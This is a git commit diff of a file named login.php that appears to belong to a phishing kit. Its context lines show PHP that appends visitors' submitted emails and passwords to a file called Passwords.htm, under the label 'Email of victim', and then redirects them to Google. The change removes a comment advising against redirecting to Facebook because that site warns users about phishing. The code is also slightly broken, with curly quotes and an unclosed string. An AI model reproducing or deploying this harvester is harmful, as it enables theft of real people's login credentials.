abd4682657ab5f371b0a57447a854d71065e0950
pa978ul <46637625+pa978ul@users.noreply.github.com>
2019-02-10 18:28:49 -0500

    Update login.php

--- login.php
+++ login.php
@@ -2,6 +2,5 @@
  $fp = fopen(“Passwords.htm”, “a”);
 fwrite($fp, “Email of victim:$_POST[email]\nPassword:$_POST[pass]”);
 header( ‘Location: www.google.com) ;;
-/*any web-site you want to redirect user after pressing log-in
-but not facebook.com because it gives warning that we are redirected from phishing page  remove this comment after copying */
+
 ?>
